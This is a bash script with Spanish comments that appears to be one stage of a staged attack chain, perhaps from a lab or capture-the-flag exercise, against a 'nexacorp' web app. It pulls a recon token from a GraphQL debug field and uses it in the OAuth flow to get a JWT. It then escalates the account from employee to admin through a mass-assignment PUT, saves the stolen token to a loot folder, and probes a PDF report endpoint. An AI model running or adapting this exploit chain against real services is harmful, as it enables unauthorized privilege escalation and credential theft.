#!/usr/bin/env bash
# Refrescar el JWT (Stage 2) y re-aplicar mass assignment (Stage 3) en una pasada
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

CLIENT_ID="nexacorp-prod"
REDIRECT_URI="https://app.nexacorp.io/callback"

echo "[1] recon_token fresco"
RTOK=$(curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ debugInfo { recon_token } }"}' \
  | jq -r '.data.debugInfo.recon_token')
echo "    ${RTOK}"

echo "[2] /oauth/authorize → code"
LOC=$(curl -sI -G "${API_URL}/oauth/authorize" \
  --data-urlencode "client_id=${CLIENT_ID}" \
  --data-urlencode "redirect_uri=${REDIRECT_URI}" \
  --data-urlencode "response_type=code" \
  --data-urlencode "recon_token=${RTOK}" \
  --data-urlencode "state=s$(date +%s)" \
  | tr -d '\r' | grep -i '^location:')
CODE=$(echo "${LOC}" | sed -nE 's/.*[?&]code=([^&[:space:]]+).*/\1/p')
echo "    CODE=${CODE}"

echo "[3] /oauth/token → JWT"
JWT=$(curl -s -X POST "${API_URL}/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=${CODE}&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}" \
  | jq -r '.access_token')
echo "    JWT=${JWT}"

if [[ -z "${JWT}" || "${JWT}" == "null" ]]; then
  echo "[!] No se obtuvo JWT. Aborto."
  exit 1
fi

echo
echo "[4] me ANTES (esperado: role=employee)"
curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${JWT}" \
  -d '{"query":"{ me { id email role permissions } }"}' | jq

echo
echo "[5] PUT /api/v2/users/me con role=admin (mass assignment)"
curl -s -X PUT "${API_URL}/api/v2/users/me" \
  -H "Authorization: Bearer ${JWT}" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","permissions":["admin","read","write"]}' | jq

echo
echo "[6] me DESPUÉS (esperado: role=admin)"
curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${JWT}" \
  -d '{"query":"{ me { id email role permissions } }"}' | jq

echo
echo "[7] Guardando JWT"
echo "${JWT}" > "${LOOT_DIR}/stage2_access_token.jwt"
echo "    ${LOOT_DIR}/stage2_access_token.jwt"

echo
echo "[8] Test reports/generate (esperado: pdf_size_bytes numérico)"
curl -s -X POST "${API_URL}/api/v2/reports/generate" \
  -H "Authorization: Bearer ${JWT}" \
  -H "Content-Type: application/json" \
  -d '{"template":"<html><body><h1>hello</h1></body></html>"}' \
  | jq -r '.pdf_size_bytes // .error'
